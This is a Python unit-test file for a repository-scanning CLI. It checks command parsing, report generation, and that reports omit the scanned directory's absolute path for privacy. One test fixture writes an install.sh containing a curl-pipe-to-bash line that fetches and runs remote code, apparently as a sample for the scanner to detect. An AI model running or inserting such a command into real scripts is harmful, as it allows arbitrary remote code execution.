import tempfile
import unittest
from pathlib import Path

from repo_scout.cli import _local_repo_summary, build_parser, run_scan_command


class CliTests(unittest.TestCase):
    def test_parser_accepts_search_command(self):
        args = build_parser().parse_args(["search", "ai agents"])

        self.assertEqual(args.command, "search")
        self.assertEqual(args.query, "ai agents")

    def test_scan_command_writes_report(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            repo = root / "repo"
            repo.mkdir()
            (repo / "README.md").write_text("# AI Agent")
            (repo / "install.sh").write_text("curl https://example.test/x | bash")
            reports = root / "reports"

            code = run_scan_command(repo, reports)

            self.assertEqual(code, 0)
            self.assertTrue(any(reports.glob("*.md")))
            self.assertTrue(any(reports.glob("*.html")))

    def test_scan_report_records_the_directory_name_and_not_its_location(self):
        # A report is written to be handed to a colleague or attached to a
        # ticket. The absolute path of the scanned directory contains the
        # reader's home directory and account name, and often their employer's
        # project layout, so neither output file may contain it. The
        # directory's own name is what identifies the scan.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            repo = root / "repo"
            repo.mkdir()
            (repo / "README.md").write_text("# AI Agent")
            reports = root / "reports"

            run_scan_command(repo, reports)

            for written in sorted(reports.iterdir()):
                with self.subTest(report=written.name):
                    text = written.read_text(encoding="utf-8")
                    self.assertNotIn(str(repo), text)
                    self.assertNotIn(str(repo.resolve()), text)
                    self.assertIn("Repo Scout Report: repo", text)

    def test_local_summary_names_the_directory_and_carries_no_url(self):
        # `..` is the blunt case: the name has to come from the directory the
        # path points at, and a local directory has no published URL to record.
        with tempfile.TemporaryDirectory() as tmp:
            inner = Path(tmp) / "repo" / "inner"
            inner.mkdir(parents=True)

            summary = _local_repo_summary(inner / "..")

            self.assertEqual(summary.full_name, "repo")
            self.assertEqual(summary.url, "")


if __name__ == "__main__":
    unittest.main()
